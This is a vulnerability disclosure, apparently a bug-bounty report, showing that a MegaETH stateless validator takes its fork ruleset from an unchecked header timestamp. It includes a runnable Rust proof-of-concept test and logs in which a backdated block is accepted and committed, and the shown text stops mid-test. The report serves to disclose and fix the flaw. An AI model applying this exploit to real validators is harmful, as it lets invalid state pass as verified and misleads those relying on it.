# Missing timestamp validation lets a malicious sequencer pick the EVM fork ruleset, bypass block resource limits, and get the stateless validator to accept and commit an invalid block

The stateless validator decides which EVM hardfork rules to apply to a block — the opcode/gas semantics *and* the per‑fork resource limits — purely from the block header's `timestamp` field. That field comes straight from the (untrusted) source the validator is following, and nothing anywhere in the validation path checks that it is consistent with the parent block or that it moves forward in time. A dishonest sequencer can therefore stamp a block with an old timestamp, which selects an older, more permissive fork, and slip in a block that breaks the rules the real chain is currently enforcing. The validator applies the attacker‑chosen rules, sees everything line up, marks the block valid, and writes it to its canonical chain.

## Brief / Intro

`validate_block` picks the entire consensus ruleset (`MegaSpecId` and `BlockLimits`) from `header.timestamp`, and no part of the pipeline binds that timestamp to the parent. Because the earlier MegaETH forks are more permissive than the current one — most concretely, the per‑transaction state‑growth limit is unlimited under `MiniRex` but capped at `1000` under `Rex` and later — a malicious sequencer can backdate a block's timestamp to a fork where its transactions are allowed, even though those same transactions would be rejected under the fork the chain is actually on. The stateless validator, whose entire job is to catch exactly this kind of rule‑breaking, accepts the block and commits it to its persistent canonical chain. In production this defeats the validator's core guarantee: it vouches for state transitions that violate the network's live consensus rules (starting with the state‑growth limits that keep MegaETH's state bounded, and extending to any rule that differs between forks).

## Vulnerability Details

When the validator replays a block, it builds the EVM environment and picks the block limits from the header timestamp and nothing else.

`crates/stateless-core/src/executor.rs` — `create_evm_env`:

```rust
pub fn create_evm_env(
    header: &alloy_consensus::Header,
    chain_spec: &ChainSpec,
) -> EvmEnv<MegaSpecId> {
    let cfg_env = CfgEnv::new_with_spec(chain_spec.spec_id(header.timestamp)) // fork picked from timestamp
        .with_chain_id(chain_spec.chain_id);
    ...
}
```

`crates/stateless-core/src/executor.rs` — `replay_block` picks the resource limits the same way:

```rust
let hardfork = chain_spec.hardfork(header.timestamp);          // fork from timestamp
...
let block_limits = if let Some(hardfork) = hardfork {
    BlockLimits::from_hardfork_and_block_gas_limit(hardfork, header.gas_limit)
} else {
    BlockLimits::no_limits().with_block_gas_limit(header.gas_limit)
};
```

`chain_spec.spec_id(ts)` and `chain_spec.hardfork(ts)` are pure functions of the timestamp. The header the timestamp lives in is supplied by the RPC/sequencer the validator follows, i.e. the untrusted party in this trust model.

The problem is that nothing validates that timestamp. I looked at every stage a block passes through and none of them touch it:

- `ValidatedBlock::verify_continuity` (`bin/stateless-validator/src/chain_sync.rs`) only compares the pre‑state root and pre‑withdrawals root against the parent:

  ```rust
  fn verify_continuity(&self, previous_tip: &BlockMeta) -> eyre::Result<()> {
      ensure!(self.pre_state_root == previous_tip.post_state_root, ...);
      ensure!(self.pre_withdrawals_root == previous_tip.post_withdrawals_root, ...);
      Ok(())
  }
  ```

- `BlockMeta` (the struct the continuity check compares against, `crates/stateless-core/src/db.rs`) has no timestamp field at all, so `verify_continuity` structurally cannot enforce monotonicity.

- The advancer (`crates/stateless-core/src/pipeline/advancer.rs`) only checks parent‑hash linkage: `if item.parent_hash() != current_tip.block_hash { ... reorg ... }`.

- `verify_block_integrity` (`crates/stateless-common/src/rpc_client.rs`) checks the block hash, the transaction hashes, signer recovery and the transactions root — none of which say anything about whether the timestamp is correct for this height.

So `header.timestamp` is a free variable the sequencer controls, and it single‑handedly selects the consensus ruleset the validator applies.

Why that matters: the forks are not cosmetically different, they enforce different limits. The per‑transaction and per‑block state‑growth limits are the clearest example (from mega‑evm `constants::rex::TX_STATE_GROWTH_LIMIT` / `limit.rs`):

- Under `MiniRex`: `tx_state_growth_limit` and `block_state_growth_limit` are `u64::MAX` (effectively unlimited).
- Under `Rex` and later: both are `1000`.

mega‑evm enforces these during execution. A transaction that grows state past the limit halts with `OutOfGas` and its writes revert (mega‑evm `constants.rs`: "Transactions exceeding this limit halt with `StateGrowthLimitExceeded`, preserving remaining gas"; `limit.rs` `state_growth.check_limit()`).

Put those two facts together and the attack falls out. Take a block whose single transaction writes 1010 fresh storage slots. Under `Rex` that transaction halts at slot 1001 and reverts, so it produces a different state, different receipts and different gas than if it had run to completion. Under `MiniRex` there's no limit, so it runs fully. A malicious sequencer executes the block under `MiniRex`, publishes the header roots for that execution, and sets `header.timestamp = 1` so the validator also picks `MiniRex`. The validator replays under `MiniRex`, recomputes the same roots, and everything matches — accepted. The same block presented with an honest `Rex`‑era timestamp is rejected, because under `Rex` the transaction halts and the recomputed receipts/state no longer match the header.

The end result is that the validator commits a block that could never be produced honestly on the current fork. The state‑growth limit is one instance; the same missing check lets an attacker downgrade to any earlier fork and dodge whatever that fork tightened — other resource limits, opcode/gas repricings, and EIP activations. The related header fields `base_fee_per_gas` and `excess_blob_gas` have the same problem: `create_evm_env` consumes them straight from the header and never re‑derives them from the parent per EIP‑1559/4844, so fee economics can be forged in the same self‑consistent way.

To be clear about what is *not* wrong here: the SALT witness cryptography, the state‑root continuity chain, the anchor, the witness reads, and the delta flattening are all sound and fail closed. I verified that separately. This is specifically a missing‑input‑validation bug on the header consensus fields, not a break in the proof system.

## Impact Details

The direct impact is a consensus‑soundness failure of the validator: it accepts and commits blocks that violate the network's live consensus rules. For a validator this is the worst‑case failure mode, because the whole point of the component is to reject exactly these blocks. A validator that can be steered into vouching for invalid state is worse than no validator, since it produces false assurance.

Concretely, a malicious or compromised sequencer can:

- **Bypass the state‑growth limits.** These limits exist to keep MegaETH's state from bloating without bound, which is central to the chain's design. By backdating to `MiniRex`, a sequencer can ship blocks that grow state past the `Rex` cap and have stateless validators sign off on them. Repeated over time this is unbounded state bloat that the validators fail to flag.
- **Bypass any other rule that differs between forks.** The same trick downgrades the full ruleset — the other resource limits (data size, KV updates, compute gas), opcode/gas semantics, and any EIP a later fork turned on. Anything a newer fork tightened for safety can be evaded by claiming an older timestamp.
- **Forge fee economics.** Because `base_fee_per_gas` and `excess_blob_gas` are taken from the header without re‑derivation from the parent, the sequencer can also publish a block with an arbitrary base fee (e.g. zero) and have it validated as consistent.

**Severity: High** (adjusted down from an initial Critical read). Within the repo the validator's verdict is not wired to a value-bearing consumer — a successful validation writes a local `CANONICAL_CHAIN` row and, optionally, sends a `mega_setValidatedBlocks` report to a single endpoint. So the concrete in-repo impact is **false assurance**: the validator silently blesses a state transition that violates the live fork's consensus rules, and any downstream party trusting "the stateless validator validated this block" is misled. It would rise to Critical only if that verdict gates a value-bearing path (bridge withdrawals, a fraud-proof/finality signal, fault attribution / slashing) — which is not determinable from this repository.

**Scope and trust-model note (read this before triaging).** The README's "Scope and Trust Model" section says the validator "does not verify that the blocks it receives form the canonical chain … Determining canonicality requires a consensus client [`op-node`], which derives the canonical L2 chain from L1 + DA." Two honest consequences: (1) in the **recommended** deployment (op-node + replica + validator), op-node derives L2 timestamps from L1 and would keep a backdated-timestamp block off the chain fed to the validator — so that deployment **mitigates** exploitability, and the attack is strongest against the **standalone** validator pointed at an untrusted RPC (a setup the README explicitly cautions about). (2) There is a genuine, undocumented **scope hinge**: that carve-out is worded around *ordering / forks / stale heads / reorgs* (which **sequence** of blocks is canonical), not around **within-block fork-selection from the timestamp**. The fork ruleset is an input to the STF the validator *does* claim to verify, and nothing in the docs disclaims header/timestamp validation — so the defect is not clearly foreclosed. Reasonable triagers could land on either side of this line; it is disclosed here rather than glossed over.

The root cause is a single missing check, and the fix is small: bind `header.timestamp` to the parent (require it to be non‑decreasing, and carry it in `BlockMeta` so `verify_continuity` can enforce it), and re‑derive `base_fee_per_gas` / `excess_blob_gas` from the parent instead of trusting the header. Even if canonical-timestamp correctness is considered op-node's responsibility, a cheap monotonicity sanity-check is worthwhile defense-in-depth against a buggy/compromised upstream or a no-op-node deployment.

## References

- `crates/stateless-core/src/executor.rs` — `create_evm_env` (spec/fork chosen from `header.timestamp`) and `replay_block` (`BlockLimits` chosen from `header.timestamp`); `validate_block` (the root/receipts/gas checks).
- `crates/stateless-core/src/chain_spec.rs` — `spec_id` / `hardfork` are pure functions of the timestamp; the MegaETH fork schedule.
- `bin/stateless-validator/src/chain_sync.rs` — `ValidatedBlock::verify_continuity` (only checks the state/withdrawals roots).
- `crates/stateless-core/src/db.rs` — `BlockMeta` (no timestamp field).
- `crates/stateless-core/src/pipeline/advancer.rs` — advancer (only checks `parent_hash`).
- `crates/stateless-common/src/rpc_client.rs` — `verify_block_integrity` (hash / signature / tx‑root only).
- mega‑evm `crates/mega-evm/src/constants.rs` and `crates/mega-evm/src/limit/limit.rs` — the per‑fork state‑growth limits (`u64::MAX` under MiniRex, `1000` under Rex) and their enforcement (`StateGrowthLimitExceeded`).

## Proof of Concept

There are two runnable PoCs. Both build a real block, generate a real SALT witness with `salt::Witness::create`, and drive the real validation code. The first calls `validate_block` directly; the second drives the whole validator pipeline — a real `RpcClient` over an HTTP/JSON‑RPC mock node, the real `run_pipeline`, the real `ValidatorProcessor`, and a real on‑disk `ValidatorDB` — and shows the invalid block landing in the persistent canonical‑chain table. The block used is a single, validly‑signed EIP‑1559 transaction whose contract performs 1010 fresh `SSTORE`s (state growth of 1010, over the Rex limit of 1000), with the header timestamp backdated to `1` so the validator selects `MiniRex`.

### Setup

The full‑pipeline PoC lives in `bin/stateless-validator/tests/e2e_pipeline_accept_invalid.rs`. It needs a few dev‑dependencies, added to `bin/stateless-validator/Cargo.toml`:

```toml
[dev-dependencies]
# alloy
alloy-consensus.workspace = true
alloy-eips.workspace = true
alloy-network.workspace = true
alloy-signer-local.workspace = true
alloy-trie.workspace = true

# mega
mega-evm.workspace = true

# op
op-alloy-consensus.workspace = true

# stateless
stateless-test-utils = { path = "../../crates/stateless-test-utils" }

# misc
jsonrpsee.workspace = true
jsonrpsee-types.workspace = true
tempfile.workspace = true
```

### Run

```bash
# full-pipeline PoC: the real validator commits the invalid block to its canonical chain
cargo test -p stateless-validator --test e2e_pipeline_accept_invalid -- --nocapture

# unit-level PoC: real validate_block accepts under MiniRex, rejects under Rex
cargo test -p stateless-core --test e2e_accept_invalid -- --nocapture
```

### Logs

Full‑pipeline run:

```
running 1 test
recording run (MiniRex): 1021 accessed keys, 1013 state writes (1010 contract slots), gas_used=2042348060
standalone validate_block: MiniRex=Ok, Rex=Err(ReceiptsRootMismatch { actual: 0x6ec020e039ed71c6bee9ef4196469c96f57a236597ef0a958d58ce035cbae797, claimed: 0x459813470bb76bcf6555be08e160c5a3ffb11c6db43bf404eda026c6e76812ed })

FULL-PIPELINE accept-and-commit-invalid PROVEN:
  the real RpcClient + run_pipeline + ValidatorProcessor + ValidatorDB advanced an invalid-under-Rex block
  (single tx grows state by 1010 slots, unlimited only under the backdated MiniRex ts=1)
  onto the persistent canonical chain: CANONICAL_CHAIN[1000] = 0x3ad18a6eaebb888cb61302fb9ea5f3ee70da2d21d6a389ce0c1862a8a436f898
test e2e_pipeline_commits_invalid_block ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 1.98s
```

The line that closes the case is the last one: after `run_pipeline` returns, the test reads the persistent `CANONICAL_CHAIN` table out of the on‑disk `ValidatorDB` and finds the malicious block hash at height 1000. The `standalone validate_block: MiniRex=Ok, Rex=Err(...)` line is the same `(block, witness)` run through `validate_block` under both timestamps: accepted under the backdated `MiniRex` fork, rejected under the honest `Rex` fork.

For reference, the raw limit values the two timestamps select (from the `poc_evm_ruleset_chosen_from_unvalidated_timestamp` unit test) — note `block_state_growth_limit` flipping from `1000` to `18446744073709551615` (`u64::MAX`):

```
honest   ts=5000 spec=REX5     ... tx_state_growth_limit: 1000,               block_state_growth_limit: 1000 ...
attacker ts=1    spec=MINI_REX  ... tx_state_growth_limit: 18446744073709551615, block_state_growth_limit: 18446744073709551615 ...
```

### Full‑pipeline PoC source

`bin/stateless-validator/tests/e2e_pipeline_accept_invalid.rs`:

```rust
//! FULL-PIPELINE "accept-and-commit-invalid" under a backdated fork.
//!
//! Drives the entire validator pipeline exactly as the production binary does: a real RpcClient
//! over HTTP/JSON-RPC to a mock MegaETH node, the real run_pipeline (fetch -> process -> advance),
//! the real ValidatorProcessor (validate_block under EVM replay + witness verification +
//! block-integrity checks), and a real on-disk ValidatorDB. It proves the validator accepts and
//! persistently commits a block that is INVALID under the honest (Rex) ruleset, because
//! validate_block selects the EVM fork + per-fork resource limits solely from header.timestamp.

use std::{
    cell::RefCell,
    collections::{BTreeMap, BTreeSet},
    sync::Arc,
    time::Duration,
};

use alloy_consensus::{
    Header, SignableTransaction, TxEip1559,
    transaction::{Recovered, SignerRecoverable},
};
use alloy_eips::{
    eip2718::Encodable2718,
    eip2935::{HISTORY_SERVE_WINDOW, HISTORY_STORAGE_ADDRESS},
};
use alloy_genesis::Genesis;
use alloy_network::TxSignerSync;
use alloy_primitives::{
    Address, B256, Bloom, Bytes, TxKind, U256, address, map::HashMap as AlloyHashMap,
};
use alloy_rpc_types_eth::{Block, BlockTransactions, Header as RpcHeader};
use alloy_signer_local::PrivateKeySigner;
use alloy_trie::{EMPTY_ROOT_HASH, root::ordered_trie_root_with_encoder};
use jsonrpsee::{
    RpcModule,
    server::{ServerBuilder, ServerConfigBuilder},
};
use jsonrpsee_types::error::{
    CALL_EXECUTION_FAILED_CODE, ErrorObject, ErrorObjectOwned, INVALID_PARAMS_CODE,
};
use mega_evm::{EmptyExternalEnv, MegaHardfork, MegaHardforks, MegaSpecId};
use op_alloy_consensus::OpTxEnvelope;
use op_alloy_rpc_types::Transaction;
use revm::{
    DatabaseRef,
    primitives::KECCAK_EMPTY,
    state::{AccountInfo, Bytecode},
};
use salt::{BucketId, EphemeralSaltState, MemStore, SaltWitness, StateRoot, Witness, hasher};
use stateless_common::{RpcClient, WitnessRequestKeys, encode_witness_response};
use stateless_core::{
    BisectResolver, ChainStore, ContractStore, PipelineConfig, ValidationError,
    data_types::{Account, PlainKey, PlainValue},
    db::BlockMeta,
    evm_database::WitnessDatabaseError,
    executor::{replay_block, validate_block},
    pipeline::run_pipeline,
    withdrawals::MptWitness,
};
use stateless_db::ContractCache;
use stateless_validator::{
    VALIDATOR_DB_FILENAME, ValidatorDB, ValidatorFetcher, ValidatorHooks, ValidatorProcessor,
    load_or_create_chain_spec,
};
use tokio_util::sync::CancellationToken;

const CONTRACT: Address = address!("00000000000000000000000000000000000000cc");
const COINBASE: Address = address!("4200000000000000000000000000000000000011");

const CHAIN_ID: u64 = 4326;
/// Distinct fresh storage slots the contract writes. > 1000 (the Rex per-tx state-growth limit),
/// so the tx halts under Rex but succeeds under MiniRex.
const N_SLOTS: u16 = 1010;
const BLOCK_NUMBER: u64 = 1000;
const GAS_LIMIT: u64 = 4_000_000_000;

/// Attacker's backdated timestamp: inside the MiniRex window.
const ATTACKER_TS: u64 = 1;
/// Honest timestamp: inside the Rex window.
const REX_TS: u64 = 1_800_000_000;
const HONEST_TS: u64 = REX_TS + 10;

const MAX_RESPONSE_BODY_SIZE: u32 = 1024 * 1024 * 100;

/// `for i in 1..=n { SSTORE(slot=i, value=i) }; STOP` — each iteration is +1 net state growth.
fn sstore_growth_bytecode(n: u16) -> Bytes {
    let mut code = Vec::with_capacity(n as usize * 7 + 1);
    for i in 1..=n {
        code.push(0x61); // PUSH2 (value)
        code.extend_from_slice(&i.to_be_bytes());
        code.push(0x61); // PUSH2 (key)
        code.extend_from_slice(&i.to_be_bytes());
        code.push(0x55); // SSTORE
    }
    code.push(0x00); // STOP
    Bytes::from(code)
}

/// A DatabaseRef over the tiny full pre-state that records every accessed plain key. The recorded
/// set is exactly the witness `lookups` needed so the witness-backed replay serves every read.
#[derive(Debug)]
struct RecordingDb {
    accounts: BTreeMap<Address, AccountInfo>,
    code: AlloyHashMap<B256, Bytecode>,
    parent_hash: B256,
    number: u64,
    reads: RefCell<BTreeSet<Vec<u8>>>,
}

impl DatabaseRef for RecordingDb {
    type Error = WitnessDatabaseError;

    fn basic_ref(&self, address: Address) -> Result<Option<AccountInfo>, Self::Error> {
        self.reads.borrow_mut().insert(PlainKey::Account(address).encode());
        Ok(self.accounts.get(&address).cloned())
    }

    fn code_by_hash_ref(&self, code_hash: B256) -> Result<Bytecode, Self::Error> {
        if code_hash == KECCAK_EMPTY {
            return Ok(Bytecode::new_raw(Bytes::new()));
        }
        self.code
            .get(&code_hash)
            .cloned()
            .ok_or_else(|| WitnessDatabaseError("code not found".to_string()))
    }

    fn storage_ref(&self, address: Address, index: U256) -> Result<U256, Self::Error> {
        self.reads.borrow_mut().insert(PlainKey::Storage(address, index.into()).encode());
        Ok(U256::ZERO)
    }

    fn block_hash_ref(&self, number: u64) -> Result<B256, Self::Error> {
        if number == self.number - 1 {
            return Ok(self.parent_hash);
        }
        self.storage_ref(HISTORY_STORAGE_ADDRESS, U256::from(number % HISTORY_SERVE_WINDOW as u64))
            .map(Into::into)
    }
}

/// A staggered MegaETH fork schedule: MiniRex from t=0 (no state-growth limit), Rex from a later
/// timestamp (limit 1000). op/eth forks active from genesis so apply_pre_execution_changes works.
fn staggered_genesis() -> Genesis {
    let mut genesis = Genesis::default();
    genesis.config.chain_id = CHAIN_ID;
    for (k, t) in [
        ("shanghaiTime", 0u64),
        ("cancunTime", 0),
        ("pragueTime", 0),
        ("bedrockBlock", 0),
        ("regolithTime", 0),
        ("canyonTime", 0),
        ("ecotoneTime", 0),
        ("fjordTime", 0),
        ("graniteTime", 0),
        ("holoceneTime", 0),
        ("isthmusTime", 0),
    ] {
        genesis.config.extra_fields.insert_value(k.to_string(), t).unwrap();
    }
    for (k, t) in [
        ("miniRexTime", 0u64),
        ("miniRex1Time", REX_TS - 300),
        ("miniRex2Time", REX_TS - 200),
        ("rexTime", REX_TS),
    ] {
        genesis.config.extra_fields.insert_value(k.to_string(), t).unwrap();
    }
    genesis
}

/// transactions_root exactly as verify_block_integrity computes it.
fn compute_transactions_root(txs: &[Transaction]) -> B256 {
    ordered_trie_root_with_encoder(txs, |tx, buf| tx.inner.clone().into_inner().encode_2718(buf))
}

#[allow(clippy::too_many_arguments)]
fn build_block(
    timestamp: u64,
    parent_hash: B256,
    transactions_root: B256,
    state_root: B256,
    receipts_root: B256,
    logs_bloom: Bloom,
    gas_used: u64,
    txs: Vec<Transaction>,
) -> Block<Transaction> {
    let header = Header {
        parent_hash,
        beneficiary: COINBASE,
        state_root,
        transactions_root,
        receipts_root,
        logs_bloom,
        number: BLOCK_NUMBER,
        gas_limit: GAS_LIMIT,
        gas_used,
        timestamp,
        base_fee_per_gas: Some(0),
        withdrawals_root: Some(EMPTY_ROOT_HASH),
        parent_beacon_block_root: Some(B256::ZERO),
        difficulty: U256::ZERO,
        blob_gas_used: Some(0),
        excess_blob_gas: Some(0),
        ..Default::default()
    };
    Block {
        header: RpcHeader { hash: B256::ZERO, inner: header, total_difficulty: None, size: None },
        uncles: Vec::new(),
        transactions: BlockTransactions::Full(txs),
        withdrawals: None,
    }
}

/// Flatten Revm's per-account bundle into plain (key -> optional value) SALT updates, exactly as
/// validate_block does, so the witness's updates cover precisely what the validator re-applies.
fn flatten_writes(
    accounts: &AlloyHashMap<Address, revm::database::states::BundleAccount>,
) -> BTreeMap<Vec<u8>, Option<Vec<u8>>> {
    let mut writes = BTreeMap::new();
    for (address, bundle_account) in accounts {
        if bundle_account.info != bundle_account.original_info {
            let account = bundle_account.info.as_ref().map(|info| Account {
                nonce: info.nonce,
                balance: info.balance,
                codehash: (info.code_hash != KECCAK_EMPTY).then_some(info.code_hash),
            });
            let key = PlainKey::Account(*address).encode();
            let value =
                account.and_then(|a| (!a.is_empty()).then(|| PlainValue::Account(a).encode()));
            writes.insert(key, value);
        }
        for (slot, v) in &bundle_account.storage {
            if v.previous_or_original_value != v.present_value {
                let key = PlainKey::Storage(*address, B256::new(slot.to_be_bytes())).encode();
                let value = (!v.present_value.is_zero())
                    .then(|| PlainValue::Storage(v.present_value).encode());
                writes.insert(key, value);
            }
        }
    }
    writes
}

/// Pre-decoded state for the mock node: the malicious block, its witness, and the one contract.
struct MockState {
    block: Block<Transaction>,
    block_number: u64,
    block_hash: B256,
    salt_witness: SaltWitness,
    mpt_witness: MptWitness,
    code_hash: B256,
    code_bytes: Bytes,
}

fn make_rpc_error(code: i32, msg: String) -> ErrorObject<'static> {
    ErrorObject::owned(code, msg, None::<()>)
}

fn shape_block(block: &Block<Transaction>, full_block: bool) -> Block<Transaction> {
    let mut out = block.clone();
    if !full_block {
        out.transactions = out.transactions.into_hashes();
    }
    out
}

async fn setup_mock_rpc_server(state: MockState) -> (jsonrpsee::server::ServerHandle, String) {
    let mut module = RpcModule::new(state);

    module
        .register_method("eth_blockNumber", |_params, ctx, _| {
            Ok::<String, ErrorObjectOwned>(format!("0x{:x}", ctx.block_number))
        })
        .unwrap();

    module
        .register_method("eth_getBlockByNumber", |params, ctx, _| {
            let (hex_number, full_block): (String, bool) = params
                .parse()
                .map_err(|e| make_rpc_error(INVALID_PARAMS_CODE, format!("Invalid params: {e}")))?;
            let number = u64::from_str_radix(hex_number.trim_start_matches("0x"), 16).unwrap_or(0);
            if number != ctx.block_number {
                return Err(make_rpc_error(CALL_EXECUTION_FAILED_CODE, format!("Block {number} not found")));
            }
            Ok::<_, ErrorObject<'static>>(shape_block(&ctx.block, full_block))
        })
        .unwrap();

    module
        .register_method("eth_getBlockByHash", |params, ctx, _| {
            let (hash, full_block): (B256, bool) = params
                .parse()
                .map_err(|e| make_rpc_error(INVALID_PARAMS_CODE, format!("Invalid params: {e}")))?;
            if hash != ctx.block_hash {
                return Err(make_rpc_error(CALL_EXECUTION_FAILED_CODE, format!("Block {hash} not found")));
            }
            Ok::<_, ErrorObject<'static>>(shape_block(&ctx.block, full_block))
        })
        .unwrap();

    module
        .register_method("eth_getHeaderByNumber", |params, ctx, _| {
            let (hex_number,): (String,) = params
                .parse()
                .map_err(|e| make_rpc_error(INVALID_PARAMS_CODE, format!("Invalid params: {e}")))?;
            let number = u64::from_str_radix(hex_number.trim_start_matches("0x"), 16).unwrap_or(0);
            if number != ctx.block_number {
                return Err(make_rpc_error(CALL_EXECUTION_FAILED_CODE, format!("Block {number} not found")));
            }
            Ok::<_, ErrorObject<'static>>(ctx.block.header.clone())
        })
        .unwrap();

    module
        .register_method("eth_getHeaderByHash", |params, ctx, _| {
            let (hash,): (B256,) = params
                .parse()
                .map_err(|e| make_rpc_error(INVALID_PARAMS_CODE, format!("Invalid params: {e}")))?;
            if hash != ctx.block_hash {
                return Err(make_rpc_error(CALL_EXECUTION_FAILED_CODE, format!("Block {hash} not found")));
            }
            Ok::<_, ErrorObject<'static>>(ctx.block.header.clone())
        })
        .unwrap();

    module
        .register_method("eth_getCodeByHash", |params, ctx, _| {
            let (hash,): (B256,) = params
                .parse()
                .map_err(|e| make_rpc_error(INVALID_PARAMS_CODE, format!("Invalid params: {e}")))?;
            if hash == ctx.code_hash {
                Ok::<_, ErrorObject<'static>>(ctx.code_bytes.clone())
            } else {
                Ok::<_, ErrorObject<'static>>(Bytes::new())
            }
        })
        .unwrap();

    module
        .register_method("mega_getBlockWitness", |params, ctx, _| {
            let (_keys,): (WitnessRequestKeys,) = params
                .parse()
                .map_err(|e| make_rpc_error(INVALID_PARAMS_CODE, format!("Invalid params: {e}")))?;
            let encoded = encode_witness_response(&ctx.salt_witness, &ctx.mpt_witness)
                .map_err(|e| make_rpc_error(CALL_EXECUTION_FAILED_CODE, format!("Failed to encode witness: {e}")))?;
            Ok::<_, ErrorObject<'static>>(encoded)
        })
        .unwrap();

    module
        .register_method("mega_setValidatedBlocks", |params, _ctx, _| {
            let (_first_block, last_block): ((u64, String), (u64, String)) = params.parse().unwrap();
            let last_hash: B256 = last_block.1.parse().unwrap();
            Ok::<serde_json::Value, ErrorObjectOwned>(serde_json::json!({
                "accepted": true,
                "lastValidatedBlock": [last_block.0, last_hash]
            }))
        })
        .unwrap();

    let cfg = ServerConfigBuilder::default().max_response_body_size(MAX_RESPONSE_BODY_SIZE).build();
    let server = ServerBuilder::default().set_config(cfg).build("0.0.0.0:0").await.unwrap();
    let url = format!("http://{}", server.local_addr().unwrap());
    (server.start(module), url)
}

#[tokio::test]
async fn e2e_pipeline_commits_invalid_block() {
    // 0. a real signer; the sender EOA address is derived from it.
    let signer = PrivateKeySigner::from_bytes(&B256::from([0x11u8; 32])).expect("valid signing key");
    let sender = signer.address();

    // 1. pre-state: funded sender + the state-growth contract.
    let bytecode = Bytecode::new_raw(sstore_growth_bytecode(N_SLOTS));
    let code_hash = bytecode.hash_slow();
    let sender_acct = Account { nonce: 0, balance: U256::from(10u128.pow(18)), codehash: None };
    let contract_acct = Account { nonce: 1, balance: U256::ZERO, codehash: Some(code_hash) };

    let mut pre_state: BTreeMap<Vec<u8>, Option<Vec<u8>>> = BTreeMap::new();
    pre_state.insert(PlainKey::Account(sender).encode(), Some(PlainValue::Account(sender_acct).encode()));
    pre_state.insert(PlainKey::Account(CONTRACT).encode(), Some(PlainValue::Account(contract_acct).encode()));

    let mut contracts: AlloyHashMap<B256, Bytecode> = AlloyHashMap::default();
    contracts.insert(code_hash, bytecode.clone());
    let parent_hash = B256::repeat_byte(0x11);

    // 2. persistent ValidatorDB + genesis loaded through the real genesis path.
    let temp_dir = tempfile::tempdir().unwrap();
    let db = ValidatorDB::new(temp_dir.path().join(VALIDATOR_DB_FILENAME)).unwrap();
    let genesis_path = temp_dir.path().join("genesis.json");
    std::fs::write(&genesis_path, serde_json::to_string(&staggered_genesis()).unwrap()).unwrap();
    let chain_spec = load_or_create_chain_spec(&db, Some(genesis_path.to_str().unwrap())).unwrap();

    // The fork/spec really is chosen from the timestamp alone.
    assert_eq!(chain_spec.spec_id(ATTACKER_TS), MegaSpecId::MINI_REX);
    assert_eq!(chain_spec.spec_id(HONEST_TS), MegaSpecId::REX);
    assert_eq!(chain_spec.hardfork(ATTACKER_TS), Some(MegaHardfork::MiniRex));
    assert_eq!(chain_spec.hardfork(HONEST_TS), Some(MegaHardfork::Rex));

    // 3. a real, validly-signed EIP-1559 transaction from `sender` to the contract.
    let mut tx = TxEip1559 {
        chain_id: CHAIN_ID,
        nonce: 0,
        gas_limit: GAS_LIMIT,
        max_fee_per_gas: 0,
        max_priority_fee_per_gas: 0,
        to: TxKind::Call(CONTRACT),
        value: U256::ZERO,
        access_list: Default::default(),
        input: Bytes::new(),
    };
    let signature = signer.sign_transaction_sync(&mut tx).expect("sign tx");
    let signed = tx.into_signed(signature);
    let envelope = OpTxEnvelope::Eip1559(signed);
    assert_eq!(envelope.recover_signer().expect("recover signer"), sender);

    let recovered = Recovered::new_unchecked(envelope, sender);
    let op_tx = Transaction {
        inner: alloy_rpc_types_eth::Transaction {
            inner: recovered,
            block_hash: None,
            block_number: None,
            transaction_index: None,
            effective_gas_price: None,
        },
        deposit_nonce: None,
        deposit_receipt_version: None,
    };
    let transactions_root = compute_transactions_root(std::slice::from_ref(&op_tx));

    // 4. recording run under MiniRex: collect accessed keys + the write set.
    let mut db_accounts = BTreeMap::new();
    db_accounts.insert(sender, AccountInfo { balance: sender_acct.balance, nonce: sender_acct.nonce, code_hash: KECCAK_EMPTY, code: None });
    db_accounts.insert(CONTRACT, AccountInfo { balance: contract_acct.balance, nonce: contract_acct.nonce, code_hash, code: Some(bytecode.clone()) });
    let recording_db = RecordingDb { accounts: db_accounts, code: contracts.clone(), parent_hash, number: BLOCK_NUMBER, reads: RefCell::new(BTreeSet::new()) };

    let probe_block = build_block(ATTACKER_TS, parent_hash, transactions_root, B256::ZERO, B256::ZERO, Bloom::ZERO, 0, vec![op_tx.clone()]);
    let (accounts, output) = replay_block(&chain_spec, &probe_block, &recording_db, EmptyExternalEnv, None)
        .expect("MiniRex recording replay must succeed (no state-growth limit)");

    let reads: Vec<Vec<u8>> = recording_db.reads.borrow().iter().cloned().collect();
    let writes = flatten_writes(&accounts);
    let storage_writes = writes.keys()
        .filter(|k| matches!(PlainKey::decode(k), PlainKey::Storage(addr, _) if addr == CONTRACT))
        .count();
    assert!(storage_writes >= N_SLOTS as usize, "expected >= {N_SLOTS} fresh contract storage writes, got {storage_writes}");
    println!("recording run (MiniRex): {} accessed keys, {} state writes ({storage_writes} contract slots), gas_used={}", reads.len(), writes.len(), output.gas_used);

    // 5. build the SALT witness over the pre-state.
    let store = MemStore::new();
    let pre_updates = EphemeralSaltState::new(&store).update_fin(&pre_state).unwrap();
    store.update_state(pre_updates.clone());
    let (pre_root, trie_updates) = StateRoot::new(&store).update_fin(&pre_updates).unwrap();
    store.update_trie(trie_updates);

    let bucket_ids: Vec<BucketId> = reads.iter().chain(writes.keys()).map(|k| hasher::bucket_id(k)).collect();
    let witness = Witness::create(bucket_ids, reads.iter(), &writes, &store).expect("witness creation must succeed");
    assert_eq!(witness.state_root().expect("witness carries a state root"), pre_root);
    witness.verify().expect("freshly built witness must verify");
    let salt_witness = witness.salt_witness;
    let mpt_witness = MptWitness { storage_root: EMPTY_ROOT_HASH, state: Vec::new() };

    // 6. assemble the honest MiniRex header (state root calibrated via validate_block's feedback).
    let mut block = build_block(ATTACKER_TS, parent_hash, transactions_root, B256::ZERO, output.receipts_root, output.logs_bloom, output.gas_used, vec![op_tx.clone()]);
    for _ in 0..3 {
        match validate_block(&chain_spec, &block, salt_witness.clone(), mpt_witness.clone(), &contracts, None) {
            Ok(_) => break,
            Err(ValidationError::StateRootMismatch { actual, .. }) => { block.header.inner.state_root = actual; }
            Err(e) => panic!("unexpected error while calibrating the honest header: {e:?}"),
        }
    }
    let block_hash = block.header.hash_slow();
    block.header.hash = block_hash;

    // Corroborate at the unit level: accepted under MiniRex, rejected under Rex.
    validate_block(&chain_spec, &block, salt_witness.clone(), mpt_witness.clone(), &contracts, None)
        .expect("MiniRex (backdated) must ACCEPT the state-growth block");
    let mut rex_block = block.clone();
    rex_block.header.inner.timestamp = HONEST_TS;
    let rex = validate_block(&chain_spec, &rex_block, salt_witness.clone(), mpt_witness.clone(), &contracts, None);
